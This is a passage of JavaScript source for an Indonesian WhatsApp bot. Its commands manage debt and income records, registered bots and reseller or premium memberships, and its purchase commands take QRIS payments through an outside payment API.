    fs.writeFileSync("./src/botlist.json", JSON.stringify(botList, null, 2));

    Reply(`✅ *Berhasil menghapus bot:*\n` +
            `🤖 *Nomor Bot*: ${deletedBot.nomorBot}\n` +
            `👤 *Nama Owner*: ${deletedBot.namaOwner}\n` +
            `📞 *Nomor Owner*: ${deletedBot.nomorOwner}\n` +
            `⏰ *Waktu Pembuatan*: ${deletedBot.waktu}`);
}
break;

case 'listhutang': case 'listdp': {
    if (!isCreator) return Reply(mess.owner);

    if (hutangList.length < 1) {
        return m.reply("Tidak ada data hutang atau DP saat ini. ❌");
    }

    const hutangListFiltered = hutangList.filter(h => h.type === "Hutang");
    const dpListFiltered = hutangList.filter(h => h.type === "Dp");

    let teksnya = `📜 *DAFTAR HUTANG DAN DP* 📜\n\n`;

    if (hutangListFiltered.length > 0) {
        teksnya += `📌 *DAFTAR HUTANG:*\n\n`;
        hutangListFiltered.forEach((h, i) => {
            teksnya += `➡️ ${i + 1}. @${h.user.split("@")[0]}\n   💵 *Nominal*: Rp${h.nominal}\n   📝 *Deskripsi*: ${h.deskripsi}\n   ⏰ *Waktu*: ${h.waktu}\n   🕒 *Telat*: ${h.Telat}\n\n`;
        });
    } else {
        teksnya += `📌 Tidak ada data hutang. ✅\n\n`;
    }

    if (dpListFiltered.length > 0) {
        teksnya += `📌 *DAFTAR DP:*\n\n`;
        dpListFiltered.forEach((d, i) => {
            teksnya += `➡️ ${i + 1}. @${d.user.split("@")[0]}\n   💵 *Nominal*: Rp${d.nominal}\n   📝 *Deskripsi*: ${d.deskripsi}\n   ⏰ *Waktu*: ${d.waktu}\n\n`;
        });
    } else {
        teksnya += `📌 Tidak ada data DP. ✅\n\n`;
    }

    conn.sendMessage(m.chat, { text: teksnya, mentions: hutangList.map(h => h.user) }, { quoted: qtoko });
}
break;

case 'listpendapatan': {
    if (!isCreator) return Reply(mess.owner);

    if (pendapatanList.length < 1) {
        return m.reply("Tidak ada data pendapatan saat ini. ❌");
    }

    let totalSemua = 0;
    let teksnya = `📜 *DAFTAR PENDAPATAN* 📜\n\n`;

    pendapatanList.forEach((p, i) => {
        teksnya += `➡️ ${i + 1}. 📦 *Nama Barang*: ${p.namaBarang}\n` +
                   `   💰 *Harga*: Rp${p.harga}\n` +
                   `   💳 *Pembayaran*: ${p.pembayaran}\n` +
                   `   📊 *Total*: Rp${p.total}\n` +
                   `   📅 *Tanggal*: ${p.tanggal}\n` +
                   `   ⏰ *Waktu*: ${p.waktu}\n\n`;

        totalSemua += p.total; // Menjumlahkan total pendapatan
    });

    teksnya += `━━━━━━━━━━━━━━━━━━━━\n` +
               `🤑 *TOTAL SEMUA PENDAPATAN*: Rp${totalSemua.toLocaleString("id-ID")}\n`;

    conn.sendMessage(m.chat, { text: teksnya }, { quoted: qtoko });
}
break;

case 'listbot': case 'listdb': {
    if (!isCreator) return Reply(mess.owner);

    if (botList.length < 1) {
        return Reply("Tidak ada bot yang terdaftar saat ini. ❌");
    }

    let teksnya = `📜 *DAFTAR BOT TERDAFTAR* 📜\n\n`;

    botList.forEach((bot, i) => {
        teksnya += `➡️ ${i + 1}. 🤖 *Nomor Bot*: ${bot.nomorBot}\n` +
                   `   👤 *Nama Owner*: ${bot.namaOwner}\n` +
                   `   📞 *Nomor Owner*: ${bot.nomorOwner}\n` +
                   `   ⏰ *Waktu Pendaftaran*: ${bot.waktu}\n\n`;
    });

    teksnya += `━━━━━━━━━━━━━━━━━━━━\n` +
               `📊 *TOTAL BOT TERDAFTAR*: ${botList.length} bot\n`;

    conn.sendMessage(m.chat, { text: teksnya }, { quoted: qtoko });
}
break;

case 'resethutang': 
case 'resetdp': {
    if (!isCreator) return m.reply(mess.owner);

    try {
        const fs = require('fs');
        const moment = require('moment-timezone');

        // Mengambil waktu saat ini di zona waktu Indonesia Barat (WIB)
        const tanggal = moment().tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
        const waktu = moment().tz("Asia/Jakarta").format("HH:mm:ss WIB");

        // Pastikan variabel hutangList dapat diubah
        let hutangList = [];

        // Menyimpan perubahan ke file hutang.json
        fs.writeFileSync("./src/hutang.json", JSON.stringify(hutangList, null, 2));

        // Mengirim pesan konfirmasi dengan waktu
        m.reply(
            `✅ *Berhasil mereset semua hutang dan DP!*\n` +
            `📅 *Tanggal:* ${tanggal}\n` +
            `⏰ *Waktu:* ${waktu}\n` +
            `------------------------------\n` +
            `🗑️ Semua data telah dihapus.`
        );

    } catch (error) {
        console.error("❌ Error saat mereset data:", error);
        m.reply("⚠️ *Terjadi kesalahan saat mereset data.*");
    }
} 
break;

case 'resetpendapatan': {
    if (!isCreator) return m.reply(mess.owner);

    try {
        const fs = require('fs');
        const moment = require('moment-timezone');

        // Mengambil waktu saat ini di zona waktu Indonesia Barat (WIB)
        const tanggal = moment().tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
        const waktu = moment().tz("Asia/Jakarta").format("HH:mm:ss WIB");

        // Mengosongkan daftar pendapatan
        let pendapatanList = [];

        // Menyimpan perubahan ke file pendapatan.json
        fs.writeFileSync("./src/pendapatan.json", JSON.stringify(pendapatanList, null, 2));

        // Mengirim pesan konfirmasi dengan waktu
        m.reply(
            `✅ *Berhasil mereset semua data pendapatan!*\n` +
            `📅 *Tanggal:* ${tanggal}\n` +
            `⏰ *Waktu:* ${waktu}\n` +
            `------------------------------\n` +
            `🗑️ Semua data telah dihapus.`
        );

    } catch (error) {
        console.error("❌ Error saat mereset data:", error);
        m.reply("⚠️ *Terjadi kesalahan saat mereset data.*");
    }
}
break;

case 'resetbot': case 'resetdb': {
    if (!isCreator) return m.reply(mess.owner);

    try {
        const fs = require('fs');
        const moment = require('moment-timezone');

        // Mengambil waktu saat ini di zona waktu Indonesia Barat (WIB)
        const tanggal = moment().tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
        const waktu = moment().tz("Asia/Jakarta").format("HH:mm:ss WIB");

        // Mengosongkan daftar bot
        let botList = [];

        // Menyimpan perubahan ke file botlist.json
        fs.writeFileSync("./src/botlist.json", JSON.stringify(botList, null, 2));

        // Mengirim pesan konfirmasi dengan waktu
        Reply(
            `✅ *Berhasil mereset semua data bot!*\n` +
            `📅 *Tanggal:* ${tanggal}\n` +
            `⏰ *Waktu:* ${waktu}\n` +
            `------------------------------\n` +
            `🗑️ Semua data bot telah dihapus.`
        );

    } catch (error) {
        console.error("❌ Error saat mereset data bot:", error);
        Reply("⚠️ *Terjadi kesalahan saat mereset data bot.*");
    }
}
break;

case 'addrespon': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delrespon': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listrespon': {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'scfree': {
  let teks = `█▀▀▄ ▄▀▄ █▀ ▄▀▄ ▀█▀ █░█ ▄▀▄
█▐█▀ █▀█ █▀ █▀█ ░█░ █▀█ █▀█
▀░▀▀ ▀░▀ ▀░ ▀░▀ ░▀░ ▀░▀ ▀░▀
█▀▀▄
█▐█▀
▀░▀▀\n🔥 Haii @${m.sender.split("@")[0]} 👋,\n🚀 Mau Script Free Dan Berkualitas Premium? Join Group Dan Channel Developer Kami! 💎\n\n🔹 *Group Developer 1:*\n👉 https://chat.whatsapp.com/HXNIKehdsac53obygXOEAC\n\n🔹 *Group Developer 2:*\n👉 https://chat.whatsapp.com/IbLbagzflGJB5VihxpC9z0\n\n🔹 *Group Developer 3:*\n👉 https://chat.whatsapp.com/CVWsf7yttCiAALNbwaMoNw\n\n🌟 *Channel Developer:*\n📢 https://whatsapp.com/channel/0029VaqgmI2Jf05dg5Fweh0T\n\n⚡ *NOTE: JOIN SEKARANG! BANYAK SCRIPT GRATIS DAN BERKUALITAS PREMIUM!* 🚀`;

  await conn.sendMessage(m.chat, {
    text: teks,
    footer: `✨ © 2025 ${botname} ✨`,
    headerType: 1,
    viewOnce: true,
    buttons: [
      { buttonId: `.owner`, buttonText: { displayText: '🛑 Hubungi Developer' }, type: 1 }
    ],
    contextInfo: {
      isForwarded: true, 
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"], 
    },
  }, {quoted: qtext2});
}
break;

case 'cekstatus': {
    let status;
    
    if (isCreator) {
        status = "👑 Ownerbot"; // Pemilik bot
    } else if (isPremium) {
        status = "💎 Reseller Panel"; // Pengguna premium (reseller)
    } else if (isSeller) {
        status = "🛒 Premium Pengguna"; // Pengguna dengan akses jual beli
    } else {
        status = "🆓 Free User"; // Pengguna gratis
    }

    Reply(`Your Status: *(${status})*`);
}
break;

case 'buysell': {
if (cekSaldo(m.sender,db_saldo) < 15000) return conn.sendMessage(from, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}\n\n*Buy Saldo Akses ? Pm Owner !*\n*Owner:*\n*wa.me/62895373974000*\n*々 IjulTaka || 乂*`, mentions: [m.sender]}, { quoted: m })
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
Reply(`Selamat Kepada ${m.pushName} dengan nomor ${input2} telah menjadi seller✅

*KEUNTUNGAN RESELLER👇🏻*
*1 BISA BUAT PANEL VIA BOT!*
*2 BISA CREATE PANEL SEPUASNYA*

*RULES :*
*1 DILARANG KERAS MENCURI SCRIPT ( SC )!*
*2 DILARANG MENGINTIP PANEL ORG!*
*3 DILARANG BUAT PANEL TAPI GA DIPAKAI!*
*4 DILARANG ADA BOT KECUALI BOT PEMILIK ( OWNER UTAMA )*
*5 DILARANG PROMOSI!!*
*JEDA BOT MINIMAL 5 MENIT*
*6 UNLI HANYA UNTUK OWNER PANEL!*

*NOTE : JIKA MELANGGAR DIATAS KICK NO REFF!!*`)
}
minSaldo(m.sender, 15000, db_saldo)
break

case 'buyseller': {
    if (m.isGroup) return m.reply("Pembelian hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    // Menampilkan pilihan harga
    await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            { buttonId: '.buyseller_10000', buttonText: { displayText: '💼 Paket 1 Bulan Full (Rp10.000)' }, type: 1 },
            { buttonId: '.buyseller_15000', buttonText: { displayText: '🔥 Paket Permanen Full (Rp15.000)' }, type: 1 }
        ],
        headerType: 1,
        viewOnce: true,
        text: "🛒 *Pilih Paket Seller yang Anda Inginkan:*\n\n💼 *Paket 1 Bulan Full:* Rp10.000\n🔥 *Paket Permanen Full:* Rp15.000\n\nSilakan pilih harga di bawah:",
        contextInfo: { mentionedJid: [m.sender] }
    });
}
break;

case 'buyseller_10000': 
case 'buyseller_15000': {
    if (m.isGroup) return m.reply("Pembelian hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    // Menentukan harga sesuai pilihan
    const harga = command === 'buyseller_10000' ? 10000 : 15000; 
    const paket = command === 'buyseller_10000' ? "💼 Paket 1 Bulan Full" : "🔥 Paket Permanen Full";
    const amount = harga + generateRandomNumber(110, 250); // Penyesuaian unik harga
    const UrlQr = global.qrisOrderKuota;

    // Request pembayaran ke API
    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);
    
    if (!get.data.result) return m.reply("Gagal membuat pembayaran, coba lagi nanti.");
    
    const teks3 = `
    *📌 INFORMASI PEMBAYARAN*

    *• ID Transaksi:* ${get.data.result.transactionId}
    *• Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}
    *• Paket:* ${paket}
    *• Expired:* 5 menit

    📌 *Note:* Pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis mengkonfirmasi status pembayaran kamu.
    Ketik *.batalbeli* untuk membatalkan.
    `;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: '❌ Batalkan Pembelian' }, type: 1 }],
        headerType: 1,
        viewOnce: true,
        image: { url: get.data.result.qrImageUrl },
        caption: teks3,
        contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi dalam database
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "⚠️ QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        },
    };

    await db.users[m.sender].saweria.exp();

    // Loop pengecekan status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = resultcek.data;

        if (req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await conn.sendMessage(db.users[m.sender].saweria.chat, {
                text: `✅ *PEMBAYARAN BERHASIL!*\n\n*• ID:* ${db.users[m.sender].saweria.idDeposit}\n*• Total:* Rp${await toIDR(db.users[m.sender].saweria.amount)}\n*• Paket:* ${paket}`
            }, { quoted: db.users[m.sender].saweria.msg });

            // Menambahkan pengguna sebagai Seller Panel
            const input = m.sender;
            premium.push(input);
            await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));

            // Kirim notifikasi seller baru
            Reply(`🎉 *Selamat!*\n${m.pushName} dengan nomor ${m.sender.split('@')[0]} telah menjadi seller panel ✅\n\n🔹 *Paket:* ${paket}\n\n📜 *Keuntungan Seller Panel:*\n1. Bisa Buat Panel Via Bot\n2. Bisa Create Panel Sepuasnya!\n3. Bisa Create Panel 1Gb-Unlimited\n\n⚠️ *Rules:*\n1. Dilarang mencuri script!\n2. Dilarang mengintip panel orang!\n3. Dilarang promosi!\n\nJika melanggar, akses akan dicabut tanpa refund!`);

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'buyseller2': {
    if (m.isGroup) return m.reply("Pembelian hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    // Menampilkan pilihan harga
    await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            { buttonId: '.buyseller2_15000', buttonText: { displayText: '💼 Paket 1 Bulan Full (Rp15.000)' }, type: 1 },
            { buttonId: '.buyseller2_20000', buttonText: { displayText: '🔥 Paket Permanen Full (Rp20.000)' }, type: 1 }
        ],
        headerType: 1,
        viewOnce: true,
        text: "🛒 *Pilih Paket Seller yang Anda Inginkan:*\n\n💼 *Paket 1 Bulan Full:* Rp15.000\n🔥 *Paket Permanen Full:* Rp20.000\n\nSilakan pilih harga di bawah:",
        contextInfo: { mentionedJid: [m.sender] }
    });
}
break;

case 'buyseller2_15000': 
case 'buyseller2_20000': {
    if (m.isGroup) return m.reply("Pembelian hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    // Menentukan harga sesuai pilihan
    const harga = command === 'buyseller_15000' ? 15000 : 20000; 
    const paket = command === 'buyseller_15000' ? "💼 Paket 1 Bulan Full" : "🔥 Paket Permanen Full";
    const amount = harga + generateRandomNumber(110, 250); // Penyesuaian unik harga
    const UrlQr = global.qrisOrderKuota;

    // Request pembayaran ke API
    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);
    
    if (!get.data.result) return m.reply("Gagal membuat pembayaran, coba lagi nanti.");
    
    const teks3 = `
    *📌 INFORMASI PEMBAYARAN*

    *• ID Transaksi:* ${get.data.result.transactionId}
    *• Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}
    *• Paket:* ${paket}
    *• Expired:* 5 menit

    📌 *Note:* Pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis mengkonfirmasi status pembayaran kamu.
    Ketik *.batalbeli* untuk membatalkan.
    `;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: '❌ Batalkan Pembelian' }, type: 1 }],
        headerType: 1,
        viewOnce: true,
        image: { url: get.data.result.qrImageUrl },
        caption: teks3,
        contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi dalam database
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "⚠️ QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        },
    };

    await db.users[m.sender].saweria.exp();

    // Loop pengecekan status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = resultcek.data;

        if (req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await conn.sendMessage(db.users[m.sender].saweria.chat, {
                text: `✅ *PEMBAYARAN BERHASIL!*\n\n*• ID:* ${db.users[m.sender].saweria.idDeposit}\n*• Total:* Rp${await toIDR(db.users[m.sender].saweria.amount)}\n*• Paket:* ${paket}`
            }, { quoted: db.users[m.sender].saweria.msg });

            // Menambahkan pengguna sebagai Seller Panel
            const input = m.sender;
            premium2.push(input);
            await fs.writeFileSync("./library/database/premium2.json", JSON.stringify(premium2, null, 2));

            // Kirim notifikasi seller baru
            Reply(`🎉 *Selamat!*\n${m.pushName} dengan nomor ${m.sender.split('@')[0]} telah menjadi seller 2 panel ✅\n\n🔹 *Paket:* ${paket}\n\n📜 *Keuntungan Seller Panel:*\n1. Bisa Buat Panel Via Bot\n2. Bisa Create Panel Sepuasnya!\n3. Bisa Create Panel 1Gb-Unlimited\n\n⚠️ *Rules:*\n1. Dilarang mencuri script!\n2. Dilarang mengintip panel orang!\n3. Dilarang promosi!\n\nJika melanggar, akses akan dicabut tanpa refund!`);

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'buypremium': {
    if (m.isGroup) return m.reply("Pembelian hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    // Menampilkan pilihan harga
    await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            { buttonId: '.buypremium_10000', buttonText: { displayText: '🌐 Paket 1 Bulan Full (Rp10.000)' }, type: 1 },
            { buttonId: '.buypremium_15000', buttonText: { displayText: '🚀 Paket Permanen Full (Rp15.000)' }, type: 1 }
        ],
        headerType: 1,
        viewOnce: true,
        text: "📌 *Pilih Paket Premium Subdomain yang Anda Inginkan:*\n\n🌐 *Paket 1 Bulan Full:* Rp10.000\n🚀 *Paket Permanen Full:* Rp15.000\n\nSilakan pilih harga di bawah:",
        contextInfo: { mentionedJid: [m.sender] }
    });
}
break;

case 'buypremium_10000': 
case 'buypremium_15000': {
    if (m.isGroup) return m.reply("Pembelian hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    // Menentukan harga sesuai pilihan
    const harga = command === 'buypremium_10000' ? 10000 : 15000; 
    const paket = command === 'buypremium_10000' ? "🌐 Paket 1 Bulan Full" : "🚀 Paket Permanen Full";
    const amount = harga + generateRandomNumber(110, 250); // Penyesuaian unik harga
    const UrlQr = global.qrisOrderKuota;

    // Request pembayaran ke API
    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);
    
    if (!get.data.result) return m.reply("Gagal membuat pembayaran, coba lagi nanti.");
    
    const teks3 = `
    *📌 INFORMASI PEMBAYARAN*

    *• ID Transaksi:* ${get.data.result.transactionId}
    *• Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}
    *• Paket:* ${paket}
    *• Expired:* 5 menit

    📌 *Note:* Pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis mengkonfirmasi status pembayaran kamu.
    Ketik *.batalbeli* untuk membatalkan.
    `;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: '❌ Batalkan Pembelian' }, type: 1 }],
        headerType: 1,
        viewOnce: true,
        image: { url: get.data.result.qrImageUrl },
        caption: teks3,
        contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi dalam database
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "⚠️ QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        },
    };

    await db.users[m.sender].saweria.exp();

    // Loop pengecekan status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = resultcek.data;

        if (req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await conn.sendMessage(db.users[m.sender].saweria.chat, {
                text: `✅ *PEMBAYARAN BERHASIL!*\n\n*• ID:* ${db.users[m.sender].saweria.idDeposit}\n*• Total:* Rp${await toIDR(db.users[m.sender].saweria.amount)}\n*• Paket:* ${paket}`
            }, { quoted: db.users[m.sender].saweria.msg });

            // Menambahkan pengguna sebagai Premium Subdomain
            const input = m.sender;
            seller.push(input);
            await fs.writeFileSync("./library/database/seller.json", JSON.stringify(seller, null, 2));

            // Kirim notifikasi premium baru
            Reply(`🎉 *Selamat!*\n${m.pushName} dengan nomor ${m.sender.split('@')[0]} telah mendapatkan akses premium subdomain ✅\n\n🔹 *Paket:* ${paket}\n\n📜 *Keuntungan Premium Subdomain:*\n1. Bisa Buat Domain Sepuasnya\n2. Bisa Create Panel Sepuasnya!\n\n⚠️ *Rules:*\n1. Dilarang digunakan untuk phising!\n2. Dilarang spam bot!\n3. Dilarang promosi!\n\nJika melanggar, akses akan dicabut tanpa refund!`);

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'listall': {
    let lists = [
        { name: "Owner Tambahan", data: owners },
        { name: "Premium Subdomain", data: seller },
        { name: "Reseller Panel", data: premium },
        { name: "Reseller Panel 2", data: premium2 }
    ];
    
    let teks = "";
    let mentions = [];
    
    for (let list of lists) {
        if (list.data.length > 0) {
            teks += `\n━━━━━━━━━━━━━━━━━━━━\n`;
            teks += ` *乂 List all ${list.name}*\n`;
            teks += `━━━━━━━━━━━━━━━━━━━━\n`;
            for (let i of list.data) {
                let user = i.split("@")[0];
                teks += `\n- *${user}*\n  *Tag:* @${user}\n`;
                mentions.push(i);
            }
        }
    }
    
    if (teks === "") return Reply("Tidak ada data yang tersedia.");
    
    conn.sendMessage(m.chat, { text: teks, mentions: mentions }, { quoted: qtext2 });
}
break;

case 'addseller': {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
Reply(`Berhasil menambah reseller ✅\nNomor: ${input2}🔥`)
}
break

case 'addseller2': {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium2.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi reseller2!`)
premium2.push(input)
await fs.writeFileSync("./library/database/premium2.json", JSON.stringify(premium2, null, 2))
Reply(`Berhasil menambah reseller ✅\nNomor: ${input2}🔥`)
}
break

case 'addprem': {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || seller.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi premium!`)
seller.push(input)
await fs.writeFileSync("./library/database/seller.json", JSON.stringify(seller, null, 2))
Reply(`Berhasil menambah premium ✅\nNomor: ${input2}🔥`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listseller': {
    if (premium.length < 1) return Reply("Tidak ada user reseller");
    
    let teks = `\n *乂 List All Reseller Panel*\n`;
    teks += `──────────────────────────\n`; // Garis pemisah
    
    for (let i of premium) {
        teks += `\n* ${i.split("@")[0]}\n`;
        teks += `* *Tag :* @${i.split("@")[0]}\n`;
        teks += `──────────────────────────\n`; // Garis pemisah antar reseller
    }
    
    teks += `\n *Total Reseller:* ${premium.length}\n`; // Menampilkan total reseller
    
    conn.sendMessage(m.chat, { text: teks, mentions: premium }, { quoted: qtext2 });
}
break;

case 'listseller2': {
    if (premium2.length < 1) return Reply("Tidak ada user reseller 2");

    let teks = `\n *乂 List All Reseller 2 Panel*\n`;
    teks += `──────────────────────────\n`; // Garis pemisah

    for (let i of premium2) {
        teks += `\n* ${i.split("@")[0]}\n`;
        teks += `* *Tag :* @${i.split("@")[0]}\n`;
        teks += `──────────────────────────\n`; // Garis pemisah antar reseller
    }

    teks += `\n *Total Reseller 2:* ${premium2.length}\n`; // Menampilkan total reseller

    conn.sendMessage(m.chat, { text: teks, mentions: premium2 }, { quoted: qtext2 });
}
break;

case 'listprem': {
    if (seller.length < 1) return Reply("Tidak ada user premium");

    let teks = `\n *乂 List All Pengguna Premium*\n`;
    teks += `──────────────────────────\n`; // Garis pemisah

    for (let i of seller) {
        teks += `\n* ${i.split("@")[0]}\n`;
        teks += `* *Tag :* @${i.split("@")[0]}\n`;
